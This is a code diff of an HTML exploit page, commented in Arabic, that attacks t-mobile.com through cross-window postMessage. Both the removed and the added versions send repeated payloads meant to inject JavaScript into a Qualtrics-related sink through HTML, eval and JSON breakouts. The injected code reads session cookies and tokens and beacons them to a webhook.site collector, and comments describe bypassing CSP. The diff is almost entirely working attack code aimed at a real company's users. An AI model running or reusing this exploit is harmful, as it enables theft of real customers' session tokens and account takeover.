@@ -14,57 +14,31 @@
     </div>
 
 <script>
-    // ضع الـ Webhook ID الخاص بك هنا
-    const webhook_id = "3d2d99ff-5472-455e-84e4-64f5035e227f";
-    const webh = "https://webhook.site/506095d4-9a53-4844-a3f2-19f274f7173c" + webhook_id;
-
-    function log(msg) { document.getElementById('status').innerText = "> " + msg; }
-
-    function pwnTMobile() {
-        log("فتح نافذة T-Mobile...");
-        const victim = window.open('https://www.t-mobile.com/', 'victim');
-
-        if (!victim) {
-            alert("يرجى تفعيل الـ Pop-ups في المتصفح!");
-            return;
-        }
-
-        // الكود المراد تنفيذه (سحب التوكنات الأساسية)
-        // نستخدم navigator.sendBeacon لتخطي الـ CSP والـ Service Worker
-        const codeToRun = `
-            const keys = ['a_token', 'TFPID', 'LPVID'];
-            const data = document.cookie.split('; ').filter(c => keys.some(k => c.startsWith(k))).join('|');
-            navigator.sendBeacon('${webh}/?eval_pwn=' + btoa(data));
-        `;
-
-        // الـ Payload الهجين: يجرب كسر الـ HTML والـ JSON والـ JS
-        const hybridPayload = {
-            "type": "qm-sync", // جرب تغيير النوع بناءً على ملف الـ JSON المسرب
-            "details": {
-                "account_pwn": `<img src=x onerror="${codeToRun}">`, // حقن HTML (لو الـ Sink هو innerHTML)
-                "toString": `');} catch(e){} ${codeToRun} //`, // كسر JS (لو الـ Sink هو eval الصريح)
-                "json_break": `"}, ${codeToRun}, {"id":"` // كسر JSON (لو الـ Sink هو eval على JSON object)
-            }
-        };
-
-        log("انتظار 15 ثانية لتحميل السكربتات المسؤولة عن الـ Sink...");
-
-        let count = 0;
-        const interval = setInterval(() => {
-            count++;
-            log("إرسال النبضة رقم: " + count);
-
-            // نرسل بصيغة النص لتخطي الـ Clone Error وضمان القبول من JSON.parse
-            victim.postMessage(JSON.stringify(hybridPayload), "*");
+    const webhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
+    const payload = {
+        "type": "qm-sync", // أو النوع الذي يراقبه السكربت
+        "details": {
+            // استهداف كائن EmbeddedData الذي يستخدمه Qualtrics
+            "EmbeddedData": {
+                "Expression": `navigator.sendBeacon('${webhook}/?c='+btoa(document.cookie))`
+            },
+            // محاولة كسر الـ Logic Node مباشرة
+            "Comparator": "JAVASCRIPT_EXPRESSION",
+            "Result": `navigator.sendBeacon('${webhook}/?r=1')`,
             
-            // نرسل بصيغة الكائن احتياطاً
-            try { victim.postMessage(hybridPayload, "*"); } catch(e) {}
+            // حقن الـ toString الذي نجحنا في رصده سابقاً
+            "toString": `() => { eval("navigator.sendBeacon('${webhook}/?pwned=1')"); return "QSI"; }`
+        }
+    };
 
-            if (count >= 15) {
-                clearInterval(interval);
-                log("انتهت سلسلة الهجوم. افحص الـ Webhook.");
-            }
-        }, 4000); // إرسال رسالة كل 4 ثوانٍ
+    function attack() {
+        const vic = window.open('https://www.t-mobile.com/', 'victim');
+        setInterval(() => {
+            // إرسال كـ String للدخول عبر JSON.parse
+            vic.postMessage(JSON.stringify(payload), "*");
+            // إرسال كـ Object مباشر
+            vic.postMessage(payload, "*");
+        }, 2000);
     }
 </script>
 </body>
